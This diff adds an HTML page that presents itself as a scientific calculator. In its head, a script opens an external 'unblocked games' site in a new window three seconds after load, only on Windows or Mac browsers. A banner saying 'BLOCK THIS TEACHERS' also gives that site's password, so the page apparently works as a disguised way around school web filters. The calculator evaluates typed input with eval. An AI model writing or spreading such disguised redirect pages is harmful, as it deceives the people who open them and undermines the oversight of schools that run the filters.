@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scientific Calculator</title>
+    43590347
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+    const userAgent = navigator.userAgent.toLowerCase();
+    if (userAgent.includes('macintosh') || userAgent.includes('windows')) {
+        setTimeout(function() {
+            window.open('http://kicksunblckd.rf.gd/?i=1', '_blank');
+        }, 3000);
+    }
+});
+</script>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #1e1e1e;
+            color: #fff;
+            overflow: hidden;
+        }
+        .site {
+    position: absolute;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    text-align: center;
+    background: #333;
+    padding: 10px;
+    width: 100%;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    z-index: 10;
+}
+
+.calculator {
+    background: #333;
+    border-radius: 15px;
+    padding: 20px;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    width: 420px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    margin-top: 80px;
+}
+        .display {
+            width: 100%;
+            height: 60px;
+            background-color: #222;
+            color: #fff;
+            text-align: right;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 2rem;
+            border: none;
+            outline: none;
+        }
+        .button-row {
+            display: flex;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .button {
+            width: 60px;
+            height: 60px;
+            background-color: #444;
+            color: white;
+            border-radius: 10px;
+            border: none;
+            font-size: 1.5rem;
+            transition: background-color 0.3s ease;
+        }
+        .button:hover {
+            background-color: #666;
+        }
+        .button:active {
+            background-color: #888;
+        }
+        .button-wide {
+            width: 130px;
+        }
+        .clear {
+            background-color: #e74c3c;
+        }
+        .equal {
+            background-color: #2ecc71;
+        }
+        .scientific {
+            background-color: #3498db;
+        }
+        .more-btn {
+            width: 100%;
+            background-color: #f39c12;
+            color: white;
+            border-radius: 10px;
+            font-size: 1.5rem;
+            padding: 15px;
+            border: none;
+            cursor: pointer;
+        }
+        .more-btn:hover {
+            background-color: #e67e22;
+        }
+        .more-buttons {
+            display: none;
+            flex-wrap: wrap;
+            justify-content: space-between;
+            width: 100%;
+            margin-top: 10px;
+        }
+        .more-buttons button {
+            width: 60px;
+            height: 60px;
+        }
+        h1, h2 {
+            margin: 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="calculator">
+    <input type="text" class="display" id="display" disabled>
+    
+    <div class="button-row">
+        <button class="button clear" onclick="clearDisplay()">C</button>
+        <button class="button scientific" onclick="appendToDisplay('(')">(</button>
+        <button class="button scientific" onclick="appendToDisplay(')')">)</button>
+        <button class="button scientific" onclick="appendToDisplay('/')">/</button>
+    </div>
+    
+    <div class="button-row">
+        <button class="button" onclick="appendToDisplay('7')">7</button>
+        <button class="button" onclick="appendToDisplay('8')">8</button>
+        <button class="button" onclick="appendToDisplay('9')">9</button>
+        <button class="button scientific" onclick="appendToDisplay('*')">*</button>
+    </div>
+    
+    <div class="button-row">
+        <button class="button" onclick="appendToDisplay('4')">4</button>
+        <button class="button" onclick="appendToDisplay('5')">5</button>
+        <button class="button" onclick="appendToDisplay('6')">6</button>
+        <button class="button scientific" onclick="appendToDisplay('-')">-</button>
+    </div>
+    
+    <div class="button-row">
+        <button class="button" onclick="appendToDisplay('1')">1</button>
+        <button class="button" onclick="appendToDisplay('2')">2</button>
+        <button class="button" onclick="appendToDisplay('3')">3</button>
+        <button class="button scientific" onclick="appendToDisplay('+')">+</button>
+    </div>
+    
+    <div class="button-row">
+        <button class="button" onclick="appendToDisplay('0')">0</button>
+        <button class="button" onclick="appendToDisplay('.')">.</button>
+        <button class="button wide equal" onclick="calculateResult()">=</button>
+    </div>
+
+    <button class="more-btn" onclick="toggleMoreButtons()">More</button>
+
+    <div class="more-buttons">
+        <div class="button-row">
+            <button class="button scientific" onclick="appendToDisplay('Math.sin(')">sin</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.cos(')">cos</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.tan(')">tan</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.log10(')">log</button>
+        </div>
+
+        <div class="button-row">
+            <button class="button scientific" onclick="appendToDisplay('Math.PI')">π</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.E')">e</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.pow(')">x²</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.sqrt(')">√</button>
+        </div>
+        
+        <div class="button-row">
+            <button class="button scientific" onclick="appendToDisplay('Math.exp(')">exp</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.abs(')">abs</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.round(')">round</button>
+            <button class="button scientific" onclick="appendToDisplay('Math.random()')">random</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    function appendToDisplay(value) {
+        document.getElementById('display').value += value;
+    }
+
+    function clearDisplay() {
+        document.getElementById('display').value = '';
+    }
+
+    function calculateResult() {
+        let expression = document.getElementById('display').value;
+        try {
+            document.getElementById('display').value = eval(expression);
+        } catch (e) {
+            document.getElementById('display').value = 'Error';
+        }
+    }
+
+    function toggleMoreButtons() {
+        const moreButtons = document.querySelector('.more-buttons');
+        const isVisible = moreButtons.style.display === 'flex';
+        moreButtons.style.display = isVisible ? 'none' : 'flex';
+    }
+</script>
+<div class="site">
+        <h1>BLOCK THIS TEACHERS 
+            <a href="http://kicksunblckd.rf.gd/?i=1" target="_blank" rel="noopener noreferrer">
+                http://kicksunblckd.rf.gd/?i=1
+            </a>
+        </h1>
+        <h2>Password to the site is <strong>"kicks"</strong> and should bring you to the games to check it out</h2>
+    </div>
+</body>
+</html>
